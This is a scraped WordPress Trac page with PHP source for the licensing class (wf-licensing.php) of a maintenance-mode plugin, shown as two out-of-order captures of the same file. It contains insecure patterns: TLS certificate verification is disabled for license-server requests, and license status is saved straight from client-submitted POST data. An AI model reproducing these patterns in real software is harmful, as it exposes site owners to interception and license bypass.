| [309](#L309) | $tmp = trim($tmp, ', '); |
| [310](#L310) | if ($tmp) { |
| [311](#L311) | $out['name\_long'] .= ' with ' . $tmp; |
| [312](#L312) | } |
| [313](#L313) | } |
| [314](#L314) |  |
| [315](#L315) | if ($license['valid\_until'] == $this->valid\_forever) { |
| [316](#L316) | $out['valid\_until'] = 'forever'; |
| [317](#L317) | $out['recurring'] = false; |
| [318](#L318) | } else { |
| [319](#L319) | $out['valid\_until'] = 'until ' . date(get\_option('date\_format'), strtotime($license['valid\_until'])); |
| [320](#L320) | $out['recurring'] = true; |
| [321](#L321) | } |
| [322](#L322) |  |
| [323](#L323) | if (date('Y-m-d') == $license['valid\_until']) { |
| [324](#L324) | $out['expires'] = 'today'; |
| [325](#L325) | } elseif (date('Y-m-d', time() + 30 \* DAY\_IN\_SECONDS) > $license['valid\_until']) { |
| [326](#L326) | $tmp = (strtotime($license['valid\_until'] . date(' G:i:s')) - time()) / DAY\_IN\_SECONDS; |
| [327](#L327) | $out['expires'] = 'in ' . round($tmp) . ' days'; |
| [328](#L328) | } else { |
| [329](#L329) | $out['expires'] = 'in more than 30 days'; |
| [330](#L330) | } |
| [331](#L331) |  |
| [332](#L332) | if (empty($license['license\_key']) || $license['license\_key'] == 'keyless') { |
| [333](#L333) | $out['keyless'] = true; |
| [334](#L334) | } else { |
| [335](#L335) | $out['keyless'] = false; |
| [336](#L336) | $out['license\_key'] = $license['license\_key']; |
| [337](#L337) | $tmp = strlen($license['license\_key']); |
| [338](#L338) | $dash = false; |
| [339](#L339) | $new = ''; |
| [340](#L340) | for ($i = $tmp - 1; $i >= 0; $i--) { |
| [341](#L341) | if ($dash == false || $out['license\_key'][$i] == '-') { |
| [342](#L342) | $new = $out['license\_key'][$i] . $new; |
| [343](#L343) | } else { |
| [344](#L344) | $new = '\*' . $new; |
| [345](#L345) | } |
| [346](#L346) | if ($out['license\_key'][$i] == '-') { |
| [347](#L347) | $dash = true; |
| [348](#L348) | } |
| [349](#L349) | } |
| [350](#L350) | $out['license\_key\_hidden'] = $new; |
| [351](#L351) | } |
| [352](#L352) |  |
| [353](#L353) | $out = apply\_filters('wf\_licensing\_license\_formatted\_' . $this->prefix, $out); |
| [354](#L354) |  |
| [355](#L355) | if (!empty($key)) { |
| [356](#L356) | return $out[$key]; |
| [357](#L357) | } else { |
| [358](#L358) | return $out; |
| [359](#L359) | } |
| [360](#L360) | } // get\_license\_formatted |
| [361](#L361) |  |
| [362](#L362) |  |
| [363](#L363) | /\*\* |
| [364](#L364) | \* Updates license details in the database. |
| [365](#L365) | \* |
| [366](#L366) | \* @param string $data License data to save; or empty to delete license |
| [367](#L367) | \* |
| [368](#L368) | \* @return bool |
| [369](#L369) | \*/ |
| [370](#L370) | function update\_license($data = false) |
| [371](#L371) | { |
| [372](#L372) | if (false === $data) { |
| [373](#L373) | $tmp = delete\_option('wf\_licensing\_' . $this->prefix); |
| [374](#L374) | } else { |
| [375](#L375) | if (!isset($data['access\_key'])) { |
| [376](#L376) | $data['access\_key'] = $this->get\_license('access\_key'); |
| [377](#L377) | } |
| [378](#L378) | $tmp = update\_option('wf\_licensing\_' . $this->prefix, $data); |
| [379](#L379) | } |
| [380](#L380) |  |
| [381](#L381) | return $tmp; |
| [382](#L382) | } // update\_license |
| [383](#L383) |  |
| [384](#L384) |  |
| [385](#L385) | /\*\* |
| [386](#L386) | \* Check if license is valid |
| [387](#L387) | \* |
| [388](#L388) | \* @param string $feature If set it checks for a specific feature. |
| [389](#L389) | \* @param bool $force\_check Forces license recheck on server instead of just cached values. |
| [390](#L390) | \* |
| [391](#L391) | \* @return boolean |
| [392](#L392) | \*/ |
| [393](#L393) | function is\_active($feature = '', $force\_check = false, $local\_only = false) |
| [394](#L394) | { |
| [395](#L395) | $last\_check = $this->get\_license('last\_check'); |
| [396](#L396) | if ($local\_only == false) { |
| [397](#L397) | if ($force\_check || ($last\_check && ($last\_check + HOUR\_IN\_SECONDS \* 8) < time())) { |
| [398](#L398) | $this->log('auto recheck license'); |
| [399](#L399) | $this->validate(); |
| [400](#L400) | } |
| [401](#L401) | } |
| [402](#L402) |  |
| [403](#L403) | $license = $this->get\_license(); |
| [404](#L404) |  |
| [405](#L405) | if ( |
| [406](#L406) | !empty($license['license\_key']) && !empty($license['name']) && |
| [407](#L407) | !empty($license['valid\_until']) && $license['valid\_until'] >= date('Y-m-d') |
| [408](#L408) | ) { |
| [409](#L409) | if (!empty($feature)) { |
| [410](#L410) | if (!empty($license['meta'][$feature]) && filter\_var($license['meta'][$feature], FILTER\_VALIDATE\_BOOLEAN) == true) { |
| [411](#L411) | return true; |
| [412](#L412) | } else { |
| [413](#L413) | return false; |
| [414](#L414) | } |
| [415](#L415) | } else { |
| [416](#L416) | return true; |
| [417](#L417) | } |
| [418](#L418) | } else { |
| [419](#L419) | return false; |
| [420](#L420) | } |
| [421](#L421) | } // is\_active |
| [422](#L422) |  |
| [423](#L423) |  |
| [424](#L424) | /\*\* |
| [425](#L425) | \* Hook to plugin activation action. |
| [426](#L426) | \* If there's a license key, try to activate & write response. |
| [427](#L427) | \* |
| [428](#L428) | \* @return void |
| [429](#L429) | \*/ |
| [430](#L430) | function activate\_plugin() |
| [431](#L431) | { |
| [432](#L432) | $license = $this->get\_license(); |
| [433](#L433) | if ($this->is\_active() || !$license['license\_key']) { |
| [434](#L434) | return false; |
| [435](#L435) | } |
| [436](#L436) |  |
| [437](#L437) | $tmp = $this->validate(); |
| [438](#L438) | if ($tmp) { |
| [439](#L439) | $this->log('activating plugin, license activated'); |
| [440](#L440) | return true; |
| [441](#L441) | } else { |
| [442](#L442) | $this->log('activating plugin, unable to activate license'); |
| [443](#L443) | return false; |
| [444](#L444) | } |
| [445](#L445) | } // activate\_plugin |
| [446](#L446) |  |
| [447](#L447) |  |
| [448](#L448) | /\*\* |
| [449](#L449) | \* Hook to plugin deactivation action. |
| [450](#L450) | \* If there's a license key, try to deactivate & write response. |
| [451](#L451) | \* |
| [452](#L452) | \* @return void |
| [453](#L453) | \*/ |
| [454](#L454) | function deactivate\_plugin() |
| [455](#L455) | { |
| [456](#L456) | if (!$this->is\_active()) { |
| [457](#L457) | return false; |
| [458](#L458) | } |
| [459](#L459) |  |
| [460](#L460) | $license = $this->get\_license(); |
| [461](#L461) | $result = $this->query\_licensing\_server('deactivate\_license'); |
| [462](#L462) |  |
| [463](#L463) | if (is\_wp\_error($result) || !is\_array($result) || !isset($result['success']) || $result['success'] == false) { |
| [464](#L464) | $this->log('unable to deactivate license'); |
| [465](#L465) |  |
| [466](#L466) | return false; |
| [467](#L467) | } else { |
| [468](#L468) | $license['error'] = ''; |
| [469](#L469) | $license['name'] = ''; |
| [470](#L470) | $license['valid\_until'] = ''; |
| [471](#L471) | $license['meta'] = ''; |
| [472](#L472) | $license['last\_check'] = 0; |
| [473](#L473) | $this->update\_license($license); |
| [474](#L474) | $this->log('license deactivated'); |
| [475](#L475) |  |
| [476](#L476) | return true; |
| [477](#L477) | } |
| [478](#L478) | } // deactivate\_plugin |
| [479](#L479) |  |
| [480](#L480) |  |
| [481](#L481) | /\*\* |
| [482](#L482) | \* Use when uninstalling (deleting) the plugin to clean up. |
| [483](#L483) | \* |
| [484](#L484) | \* @param string $prefix Same prefix as used when initialising the class. |
| [485](#L485) | \* @return bool |
| [486](#L486) | \*/ |
| [487](#L487) | static function uninstall\_plugin($prefix) |
| [488](#L488) | { |
| [489](#L489) | $tmp = delete\_option('wf\_licensing\_' . $prefix); |
| [490](#L490) |  |
| [491](#L491) | return $tmp; |
| [492](#L492) | } // uninstall\_plugin |
| [493](#L493) |  |
| [494](#L494) |  |
| [495](#L495) | /\*\* |
| [496](#L496) | \* Delete license locally and send deactivate ping to licensing server |
| [497](#L497) | \* |
| [498](#L498) | \* @return void |
| [499](#L499) | \*/ |
| [500](#L500) | function deactivate() { |
| [501](#L501) | $license = $this->get\_license(); |
| [502](#L502) | $result = $this->query\_licensing\_server('deactivate\_license', array()); |
| [503](#L503) | $this->update\_license(false); |
| [504](#L504) |  |
| [505](#L505) | return $result; |
| [506](#L506) | } // deactivate |
| [507](#L507) |  |
| [508](#L508) | /\*\* |
| [509](#L509) | \* Validate license key on server and save response. |
| [510](#L510) | \* |
| [511](#L511) | \* @param string $license\_key License key, or leave empty to pull from saved. |
| [512](#L512) | \* |
| [513](#L513) | \* @return void |
| [514](#L514) | \*/ |
| [515](#L515) | function validate($license\_key = '') |
| [516](#L516) | { |
| [517](#L517) | $license = $this->get\_license(); |
| [518](#L518) | if (empty($license\_key)) { |
| [519](#L519) | $license\_key = $license['license\_key']; |
| [520](#L520) | } |
| [521](#L521) |  |
| [522](#L522) | $out = array( |
| [523](#L523) | 'license\_key' => $license\_key, |
| [524](#L524) | 'error' => '', |
| [525](#L525) | 'name' => '', |
| [526](#L526) | 'last\_check' => 0, |
| [527](#L527) | 'valid\_until' => '', |
| [528](#L528) | 'meta' => array() |
| [529](#L529) | ); |
| [530](#L530) |  |
| [531](#L531) | $result = $this->query\_licensing\_server('validate\_license', array('license\_key' => $license\_key)); |
| [532](#L532) |  |
| [533](#L533) | if (is\_wp\_error($result)) { |
| [534](#L534) | $out['error'] = 'Error querying licensing server. ' .  $result->get\_error\_message() . ' Please try again in a few moments.'; |
| [535](#L535) | $this->update\_license($out); |
| [536](#L536) |  |
| [537](#L537) | return false; |
| [538](#L538) | } elseif (!is\_array($result) || !isset($result['success'])) { |
| [539](#L539) | $out['error'] = 'Invalid response from licensing server. Please try again in a few moments.'; |
| [540](#L540) | $this->update\_license($out); |
| [541](#L541) |  |
| [542](#L542) | return false; |
| [543](#L543) | } elseif ($result['success'] == false) { |
| [544](#L544) | $out['error'] = $result['data']; |
| [545](#L545) | $this->update\_license($out); |
| [546](#L546) |  |
| [547](#L547) | return true; |
| [548](#L548) | } else { |
| [549](#L549) | $out['error'] = $result['data']['error']; |
| [550](#L550) | $out['name'] = $result['data']['name']; |
| [551](#L551) | $out['valid\_until'] = $result['data']['valid\_until']; |
| [552](#L552) | $out['meta'] = $result['data']['meta']; |
| [553](#L553) | $out['last\_check'] = time(); |
| [554](#L554) | $this->update\_license($out); |
| [555](#L555) |  |
| [556](#L556) | return true; |
| [557](#L557) | } |
| [558](#L558) | } // validate |
| [559](#L559) |  |
| [560](#L560) |  |
| [561](#L561) | function validate\_ajax() |
| [562](#L562) | { |
| [563](#L563) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [564](#L564) |  |
| [565](#L565) | $license\_key = trim($\_REQUEST['license\_key']); |
| [566](#L566) | if (empty($license\_key)) { |
| [567](#L567) | $this->update\_license(false); |
| [568](#L568) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, false); |
| [569](#L569) |  |
| [570](#L570) | wp\_send\_json\_success(); |
| [571](#L571) | } else { |
| [572](#L572) | $result = $this->validate($license\_key); |
| [573](#L573) | $license = $this->get\_license(); |
| [574](#L574) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, $result); |
| [575](#L575) |  |
| [576](#L576) | if ($result == true) { |
| [577](#L577) | wp\_send\_json\_success($result); |
| [578](#L578) | } else { |
| [579](#L579) | wp\_send\_json\_error($license); |
| [580](#L580) | } |
| [581](#L581) | } |
| [582](#L582) | } // validate\_ajax |
| [583](#L583) |  |
| [584](#L584) |  |
| [585](#L585) | function deactivate\_ajax() |
| [586](#L586) | { |
| [587](#L587) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [588](#L588) |  |
| [589](#L589) | $old\_license = $this->get\_license(); |
| [590](#L590) | $result = $this->deactivate(); |
| [591](#L591) | do\_action('wf\_licensing\_' . $this->prefix . 'deactivate\_ajax', $old\_license, $result); |
| [592](#L592) | wp\_send\_json\_success($result); |
| [593](#L593) | } // deactivate\_ajax |
| [594](#L594) |  |
| [595](#L595) |  |
| [596](#L596) | function save\_ajax() |
| [597](#L597) | { |
| [598](#L598) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [599](#L599) |  |
| [600](#L600) | $out['license\_key'] = trim(sanitize\_text\_field($\_POST['license\_key'])); |
| [601](#L601) |  |
| [602](#L602) | if (sanitize\_text\_field($\_POST['success']) == 'true') { |
| [603](#L603) | $out['error'] = trim(sanitize\_text\_field($\_POST['data']['error'])); |
| [604](#L604) | $out['name'] = trim(sanitize\_text\_field($\_POST['data']['name'])); |
| [605](#L605) | $out['valid\_until'] = trim(sanitize\_text\_field($\_POST['data']['valid\_until'])); |
| [606](#L606) | $out['meta'] = sanitize\_text\_field($\_POST['data']['meta']); |
| [607](#L607) | } else { |
| [608](#L608) | $out['error'] = trim(sanitize\_text\_field($\_POST['data'])); |
| [609](#L609) | $out['name'] = ''; |
| [610](#L610) | $out['valid\_until'] = ''; |
| [611](#L611) | $out['meta'] = array(); |
| [612](#L612) | } |
| [613](#L613) | $out['last\_check'] = time(); |
| [614](#L614) |  |
| [615](#L615) | $this->update\_license($out); |
| [616](#L616) | do\_action('wf\_licensing\_' . $this->prefix . 'save\_ajax', $out); |
| [617](#L617) |  |
| [618](#L618) | wp\_send\_json\_success(); |
| [619](#L619) | } // save\_ajax |
| [620](#L620) |  |
| [621](#L621) |  |
| [622](#L622) | function prepare\_server\_query\_data($action) |
| [623](#L623) | { |
| [624](#L624) | $license = $this->get\_license(); |
| [625](#L625) |  |
| [626](#L626) | $query\_data = array( |
| [627](#L627) | 'action' => $action, |
| [628](#L628) | 'license\_key' => $license['license\_key'], |
| [629](#L629) | 'rand' => rand(1000, 9999), |
| [630](#L630) | 'version' => $this->version, |
| [631](#L631) | 'wp\_version' => get\_bloginfo('version'), |
| [632](#L632) | 'site\_url' => get\_home\_url(), |
| [633](#L633) | 'site\_title' => get\_bloginfo('name'), |
| [634](#L634) | 'access\_key' => $license['access\_key'], |
| [635](#L635) | 'meta' => apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_meta', array(), $action) |
| [636](#L636) | ); |
| [637](#L637) |  |
| [638](#L638) | if (substr($action, 0, 7) == 'remote\_') { |
| [639](#L639) | unset($query\_data['action'], $query\_data['license\_key']); |
| [640](#L640) | } |
| [641](#L641) |  |
| [642](#L642) | return $query\_data; |
| [643](#L643) | } // prepare\_server\_query\_data |
| [644](#L644) |  |
| [645](#L645) |  |
| [646](#L646) | /\*\* |
| [647](#L647) | \* Run license server query. |
| [648](#L648) | \* |
| [649](#L649) | \* @param string $action |
| [650](#L650) | \* @param array $data |
| [651](#L651) | \* |
| [652](#L652) | \* @return string response|bool |
| [653](#L653) | \*/ |
| [654](#L654) | function query\_licensing\_server($action, $data = array()) |
| [655](#L655) | { |
| [656](#L656) | $license = $this->get\_license(); |
| [657](#L657) |  |
| [658](#L658) | $request\_params = array('sslverify' => false, 'timeout' => 25, 'redirection' => 2); |
| [659](#L659) | $default\_data = $this->prepare\_server\_query\_data($action); |
| [660](#L660) |  |
| [661](#L661) | $request\_data = array\_merge($default\_data, $data, array('action' => $action)); |
| [662](#L662) | $request\_data = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_data', $request\_data, $action); |
| [663](#L663) | array\_walk\_recursive($request\_data, function (&$val, $ind) { |
| [664](#L664) | $val = rawurlencode($val); |
| [665](#L665) | }); |
| [666](#L666) |  |
| [667](#L667) | $this->log('query licensing server', $request\_data); |
| [668](#L668) |  |
| [669](#L669) | $url = rtrim(add\_query\_arg($request\_data, trailingslashit($this->licensing\_servers[0] . $this->api\_ver)), '&'); |
| [670](#L670) |  |
| [671](#L671) | $response = wp\_remote\_get($url, $request\_params); |
| [672](#L672) |  |
| [673](#L673) | $body = wp\_remote\_retrieve\_body($response); |
| [674](#L674) | $result = @json\_decode($body, true); |
| [675](#L675) |  |
| [676](#L676) | $this->log('licensing server response', $response); |
| [677](#L677) |  |
| [678](#L678) | if (is\_wp\_error($response) || empty($body) || !is\_array($result) || !isset($result['success'])) { |
| [679](#L679) | if (is\_wp\_error($response)) { |
| [680](#L680) | return $response; |
| [681](#L681) | } else { |
| [682](#L682) | return new WP\_Error(1, 'Invalid server response format.'); |
| [683](#L683) | } |
| [684](#L684) | } else { |
| [685](#L685) | return $result; |
| [686](#L686) | } |
| [687](#L687) | } // query\_licensing\_server |
| [688](#L688) | } // WF\_Licensing\_CSMM |
| [689](#L689) | } // if WF\_Licensing\_CSMM |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?format=txt)
* [Original Format](/export/3220669/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_cd21dc1e_20250111_113434.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fminimal-coming-soon-maintenance-mode%2Ftags%2F2.38%2Fframework%2Fwf-licensing.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=2543111 "Revision 2543111")
* [Next Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123 "Revision 3099123") →
* [Blame](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

---

# [source:](/browser?order=name "Go to repository root") [minimal-coming-soon-maintenance-mode](/browser/minimal-coming-soon-maintenance-mode?order=name "View minimal-coming-soon-maintenance-mode")/[tags](/browser/minimal-coming-soon-maintenance-mode/tags?order=name "View tags")/[2.38](/browser/minimal-coming-soon-maintenance-mode/tags/2.38?order=name "View 2.38")/[framework](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework?order=name "View framework")/[wf-licensing.php](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?order=name "View wf-licensing.php")

View diff against:

View revision:

| [Last change](/changeset/3031149/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php "View differences") on this file was [3031149](/changeset/3031149/ "View changeset 3031149"), checked in by WebFactory, [11 months ago](/timeline?from=2024-02-04T14%3A33%3A27Z&precision=second "See timeline at 02/04/2024 02:33:27 PM") |
| --- |
| Bug fixes |
| **File size:** 20.8 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | if (false === class\_exists('WF\_Licensing\_CSMM')) { |
| [3](#L3) | class WF\_Licensing\_CSMM |
| [4](#L4) | { |
| [5](#L5) | public $prefix = ''; |
| [6](#L6) | private $licensing\_servers = array(); |
| [7](#L7) | private $version = ''; |
| [8](#L8) | private $slug = ''; |
| [9](#L9) | private $basename = ''; |
| [10](#L10) | private $plugin\_page = ''; |
| [11](#L11) | private $plugin\_file = ''; |
| [12](#L12) | private $js\_folder = ''; |
| [13](#L13) | protected $api\_ver = 'v1/'; |
| [14](#L14) | protected $valid\_forever = '2035-01-01'; |
| [15](#L15) | protected $unlimited\_installs = 99999; |
| [16](#L16) | public $disable\_remote = true; |
| [17](#L17) | public $debug = false; |
| [18](#L18) |  |
| [19](#L19) |  |
| [20](#L20) | /\*\* |
| [21](#L21) | \* Init licensing by setting up various params and hooking into actions. |
| [22](#L22) | \* |
| [23](#L23) | \* @param array $params Prefix, licensing\_servers, version, plugin\_file, skip\_hooks |
| [24](#L24) | \* |
| [25](#L25) | \* @return void |
| [26](#L26) | \*/ |
| [27](#L27) | function \_\_construct($params) |
| [28](#L28) | { |
| [29](#L29) | $this->prefix = trim($params['prefix']); |
| [30](#L30) | $this->licensing\_servers = $params['licensing\_servers']; |
| [31](#L31) | $this->version = trim($params['version']); |
| [32](#L32) | $this->slug = dirname(plugin\_basename(trim($params['plugin\_file']))); |
| [33](#L33) | $this->basename = plugin\_basename(trim($params['plugin\_file'])); |
| [34](#L34) | $this->plugin\_file = $params['plugin\_file']; |
| [35](#L35) | $this->plugin\_page = trim($params['plugin\_page']); |
| [36](#L36) | $this->disable\_remote = !empty($params['disable\_remote']); |
| [37](#L37) | $this->debug = !empty($params['debug']); |
| [38](#L38) |  |
| [39](#L39) | if ($params['js\_folder']) { |
| [40](#L40) | $this->js\_folder = trim($params['js\_folder']); |
| [41](#L41) | } else { |
| [42](#L42) | $this->js\_folder = plugin\_dir\_url($this->plugin\_file) . 'js/'; |
| [43](#L43) | } |
| [44](#L44) |  |
| [45](#L45) | if (empty($params['skip\_hooks'])) { |
| [46](#L46) | register\_activation\_hook($this->plugin\_file, array($this, 'activate\_plugin')); |
| [47](#L47) | register\_deactivation\_hook($this->plugin\_file, array($this, 'deactivate\_plugin')); |
| [48](#L48) |  |
| [49](#L49) | add\_action('init', array($this, 'init')); |
| [50](#L50) |  |
| [51](#L51) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_validate', array($this, 'validate\_ajax')); |
| [52](#L52) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_save', array($this, 'save\_ajax')); |
| [53](#L53) |  |
| [54](#L54) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_deactivate', array($this, 'deactivate\_ajax')); |
| [55](#L55) | } |
| [56](#L56) |  |
| [57](#L57) | $this->log('\_\_construct', $params, get\_object\_vars($this)); |
| [58](#L58) |  |
| [59](#L59) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_refresh', array($this, 'remote\_action\_refresh')); |
| [60](#L60) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_deactivate\_license', array($this, 'remote\_action\_deactivate\_license')); |
| [61](#L61) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_validate\_license', array($this, 'remote\_action\_validate\_license')); |
| [62](#L62) |  |
| [63](#L63) | add\_action('plugins\_loaded', array($this, 'monitor\_remote\_actions')); |
| [64](#L64) | } // \_\_construct |
| [65](#L65) |  |
| [66](#L66) |  |
| [67](#L67) | /\*\* |
| [68](#L68) | \* Actions performed on WP init action. |
| [69](#L69) | \* |
| [70](#L70) | \* @return void |
| [71](#L71) | \*/ |
| [72](#L72) | function init() |
| [73](#L73) | { |
| [74](#L74) | if (is\_admin()) { |
| [75](#L75) | add\_action('admin\_enqueue\_scripts', array($this, 'admin\_enqueue\_scripts')); |
| [76](#L76) | } |
| [77](#L77) | } // init |
| [78](#L78) |  |
| [79](#L79) |  |
| [80](#L80) | function admin\_enqueue\_scripts() { |
| [81](#L81) | $current\_screen = get\_current\_screen(); |
| [82](#L82) |  |
| [83](#L83) | if (empty($current\_screen->id) || $current\_screen->id != $this->plugin\_page) { |
| [84](#L84) | return false; |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | $vars = array( |
| [88](#L88) | 'prefix' => $this->prefix, |
| [89](#L89) | 'debug' => $this->debug, |
| [90](#L90) | 'nonce' => wp\_create\_nonce('wf\_licensing\_' . $this->prefix), |
| [91](#L91) | 'licensing\_endpoint' => $this->licensing\_servers[0] . $this->api\_ver, |
| [92](#L92) | 'request\_data' => array( |
| [93](#L93) | 'action' => 'validate\_license', |
| [94](#L94) | 'license\_key' => '', |
| [95](#L95) | 'rand' => rand(1000, 9999), |
| [96](#L96) | 'version' => $this->version, |
| [97](#L97) | 'wp\_version' => get\_bloginfo('version'), |
| [98](#L98) | 'site\_url' => get\_home\_url(), |
| [99](#L99) | 'site\_title' => get\_bloginfo('name'), |
| [100](#L100) | 'meta' => array() |
| [101](#L101) | ) |
| [102](#L102) | ); |
| [103](#L103) |  |
| [104](#L104) | wp\_enqueue\_script('wf\_licensing', $this->js\_folder . 'wf-licensing.js', array(), 1.0, true); |
| [105](#L105) | wp\_localize\_script('wf\_licensing', 'wf\_licensing\_' . $this->prefix, $vars); |
| [106](#L106) | } // admin\_enqueue\_scripts |
| [107](#L107) |  |
| [108](#L108) |  |
| [109](#L109) | function monitor\_remote\_actions() |
| [110](#L110) | { |
| [111](#L111) | if ($this->disable\_remote || is\_admin()) { |
| [112](#L112) | return; |
| [113](#L113) | } |
| [114](#L114) |  |
| [115](#L115) | if (!empty($\_REQUEST[$this->prefix . '\_access\_key']) && !empty($\_REQUEST[$this->prefix . '\_action']) && isset($\_REQUEST[$this->prefix . '\_action\_params'])) { |
| [116](#L116) | $access\_key = substr(trim($\_REQUEST[$this->prefix . '\_access\_key']), 0, 32); |
| [117](#L117) | $action = substr(trim($\_REQUEST[$this->prefix . '\_action']), 0, 32); |
| [118](#L118) | $action\_params = $\_REQUEST[$this->prefix . '\_action\_params']; |
| [119](#L119) | $rand = substr($\_REQUEST[$this->prefix . '\_rand'], 0, 5); |
| [120](#L120) | $rand = preg\_replace("/[^0-9]/", '', $rand); |
| [121](#L121) |  |
| [122](#L122) | nocache\_headers(); |
| [123](#L123) | header('X-WF-Licensing-' . $this->prefix . ': ' . $this->version); |
| [124](#L124) |  |
| [125](#L125) | if (strlen($rand) != 5) { |
| [126](#L126) | wp\_send\_json\_error('Invalid random value.'); |
| [127](#L127) | } |
| [128](#L128) |  |
| [129](#L129) | if (false == $this->is\_active(false, false, true)) { |
| [130](#L130) | wp\_send\_json\_error('License is not active.'); |
| [131](#L131) | } |
| [132](#L132) |  |
| [133](#L133) | if (false == $this->is\_remote\_action($action)) { |
| [134](#L134) | wp\_send\_json\_error('Unknown remote action.'); |
| [135](#L135) | } |
| [136](#L136) |  |
| [137](#L137) | $access\_key = preg\_replace("/[^0-9a-zA-Z]/", '', $access\_key); |
| [138](#L138) | if (strlen($access\_key) != 32) { |
| [139](#L139) | wp\_send\_json\_error('Invalid access key format.'); |
| [140](#L140) | } |
| [141](#L141) |  |
| [142](#L142) | $license = $this->get\_license(); |
| [143](#L143) | if ($access\_key != $license['access\_key']) { |
| [144](#L144) | wp\_send\_json\_error('Invalid access key.'); |
| [145](#L145) | } |
| [146](#L146) |  |
| [147](#L147) | $post\_data = @json\_decode(file\_get\_contents('php://input'), true); |
| [148](#L148) | do\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_' . $action, $action\_params, $this, $post\_data); |
| [149](#L149) |  |
| [150](#L150) | wp\_send\_json\_error('Remote action did not execute.'); |
| [151](#L151) | die(); |
| [152](#L152) | } |
| [153](#L153) | } // monitor\_remote\_actions |
| [154](#L154) |  |
| [155](#L155) |  |
| [156](#L156) | function remote\_action\_refresh($action\_params) |
| [157](#L157) | { |
| [158](#L158) | $data = $this->prepare\_server\_query\_data('remote\_refresh'); |
| [159](#L159) |  |
| [160](#L160) | wp\_send\_json\_success($data); |
| [161](#L161) | } // remote\_action\_refresh |
| [162](#L162) |  |
| [163](#L163) |  |
